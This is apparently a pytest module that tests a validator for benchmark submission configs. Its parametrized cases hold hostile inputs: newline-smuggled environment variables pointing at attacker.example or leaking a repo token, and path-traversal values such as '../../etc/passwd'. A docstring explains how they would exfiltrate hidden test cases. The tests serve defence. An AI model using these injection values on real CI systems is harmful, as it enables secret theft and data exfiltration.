"""Tests for strict submission-config validation.

The injection tests are the point of this module. The evaluation job holds the
hidden-ranked-set token and provider API keys, and used to build environment
variables from these values with no validation at all.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path
from typing import Any

import pytest

pytestmark = pytest.mark.unit

_SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "validate_submission_config.py"
_spec = importlib.util.spec_from_file_location("validate_submission_config", _SCRIPT)
assert _spec is not None
assert _spec.loader is not None
_mod = importlib.util.module_from_spec(_spec)
sys.modules["validate_submission_config"] = _mod
_spec.loader.exec_module(_mod)

ConfigError = _mod.ConfigError
validate_config = _mod.validate_config


def _config(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "method": {
            "name": "my-method",
            "version": "1.0.0",
            "class_path": "submissions/alice/my-method/method.py:MyCompactor",
        },
        "runtime": {
            "provider": "groq",
            "model": "llama-3.3-70b-versatile",
            "compression_tier": "Elite-Mid",
            "drift_cycles": 2,
            "case_count_per_template": 20,
        },
        "attribution": {"handle": "alice", "org": None},
    }
    for section, values in overrides.items():
        base.setdefault(section, {})
        if isinstance(values, dict):
            base[section].update(values)  # pyright: ignore[reportUnknownMemberType]
        else:
            base[section] = values
    return base


class TestHappyPath:
    def test_valid_config_normalises(self) -> None:
        out = validate_config(_config())
        assert out["provider"] == "groq"
        assert out["model"] == "llama-3.3-70b-versatile"
        assert out["drift_cycles"] == 2
        assert out["handle"] == "alice"
        assert out["org"] is None

    def test_org_is_optional_but_validated_when_present(self) -> None:
        assert validate_config(_config(attribution={"org": "Acme Labs"}))["org"] == "Acme Labs"

    def test_surrounding_whitespace_is_stripped(self) -> None:
        assert validate_config(_config(attribution={"handle": "  alice  "}))["handle"] == "alice"


class TestEnvironmentInjection:
    """The path that let a config field exfiltrate the hidden ranked set.

    A newline in any value used to become extra lines in ``$GITHUB_ENV``. With
    ``provider: ollama`` and an injected ``COMPACTBENCH_OLLAMA_BASE_URL``, the
    runner would POST every hidden case to an attacker-controlled host as a
    prompt — with no submitter code executing at all, so sandboxing ``method.py``
    would not have helped.
    """

    @pytest.mark.parametrize(
        "malicious",
        [
            "llama3.2\nCOMPACTBENCH_OLLAMA_BASE_URL=http://attacker.example",
            "llama3.2\r\nPATH=/tmp/evil",
            "llama3.2\x00truncated",
            "llama3.2\x1b[31m",
        ],
    )
    def test_control_characters_in_model_are_rejected(self, malicious: str) -> None:
        with pytest.raises(ConfigError) as exc:
            validate_config(_config(runtime={"model": malicious}))
        assert "control character" in str(exc.value) or "not valid" in str(exc.value)

    def test_newline_in_class_path_is_rejected(self) -> None:
        with pytest.raises(ConfigError):
            validate_config(
                _config(
                    method={
                        "class_path": "submissions/a/b/method.py:C\nHIDDEN_REPO_TOKEN=leak",
                    }
                )
            )

    def test_newline_in_handle_is_rejected(self) -> None:
        with pytest.raises(ConfigError):
            validate_config(_config(attribution={"handle": "alice\nX=1"}))

    def test_whitespace_in_model_is_rejected(self) -> None:
        """Even a plain space is refused — every consumer assumes one token."""
        with pytest.raises(ConfigError):
            validate_config(_config(runtime={"model": "llama 3.3"}))


class TestProviderAllowList:
    def test_ollama_is_not_an_accepted_evaluation_provider(self) -> None:
        """`ollama` accepts an arbitrary remote host, so it is not rankable.

        Even without injection, a submission naming `ollama` could point the
        evaluator at a host it controls if the base URL were ever settable.
        """
        with pytest.raises(ConfigError, match="not an accepted evaluation provider"):
            validate_config(_config(runtime={"provider": "ollama"}))

    def test_mock_is_not_an_accepted_evaluation_provider(self) -> None:
        with pytest.raises(ConfigError, match="not an accepted evaluation provider"):
            validate_config(_config(runtime={"provider": "mock"}))

    @pytest.mark.parametrize("provider", ["groq", "google-ai-studio", "anthropic", "openai"])
    def test_accepted_providers(self, provider: str) -> None:
        assert validate_config(_config(runtime={"provider": provider}))["provider"] == provider


class TestClassPathContainment:
    def test_class_path_must_be_inside_the_touched_submission_dir(self) -> None:
        """Otherwise a submission could have the evaluator import any file in the repo."""
        with pytest.raises(ConfigError, match="points outside the submission directory"):
            validate_config(
                _config(method={"class_path": "submissions/mallory/x/method.py:C"}),
                expected_dir="submissions/alice/my-method",
            )

    def test_matching_dir_is_accepted(self) -> None:
        out = validate_config(_config(), expected_dir="submissions/alice/my-method")
        assert out["class_path"].endswith(":MyCompactor")

    @pytest.mark.parametrize(
        "bad_path",
        [
            "../../etc/passwd",
            "submissions/alice/../../evil/method.py:C",
            "/etc/passwd:C",
            "submissions/alice/my-method/other.py:C",
            "submissions/alice/my-method/method.py",
        ],
    )
    def test_malformed_class_paths_are_rejected(self, bad_path: str) -> None:
        with pytest.raises(ConfigError):
            validate_config(_config(method={"class_path": bad_path}))


class TestBounds:
    @pytest.mark.parametrize("value", [0, 6, -1, 999])
    def test_drift_cycles_out_of_range(self, value: int) -> None:
        with pytest.raises(ConfigError, match="drift_cycles"):
            validate_config(_config(runtime={"drift_cycles": value}))

    @pytest.mark.parametrize("value", [0, 101, -5])
    def test_case_count_out_of_range(self, value: int) -> None:
        with pytest.raises(ConfigError, match="case_count_per_template"):
            validate_config(_config(runtime={"case_count_per_template": value}))

    def test_booleans_are_not_integers_here(self) -> None:
        """`True` is an int in Python; accepting it would set drift_cycles=1 silently."""
        with pytest.raises(ConfigError, match="must be an integer"):
            validate_config(_config(runtime={"drift_cycles": True}))

    def test_unknown_tier_rejected(self) -> None:
        with pytest.raises(ConfigError, match="compression_tier"):
            validate_config(_config(runtime={"compression_tier": "Elite-Ultra"}))


class TestMalformedStructure:
    def test_missing_runtime_section(self) -> None:
        cfg = _config()
        del cfg["runtime"]
        with pytest.raises(ConfigError, match="runtime must be a mapping"):
            validate_config(cfg)

    def test_top_level_not_a_mapping(self) -> None:
        with pytest.raises(ConfigError, match=r"config\.yaml must be a mapping"):
            validate_config(["not", "a", "mapping"])

    def test_non_string_where_string_expected(self) -> None:
        with pytest.raises(ConfigError, match="must be a string"):
            validate_config(_config(runtime={"model": 12345}))
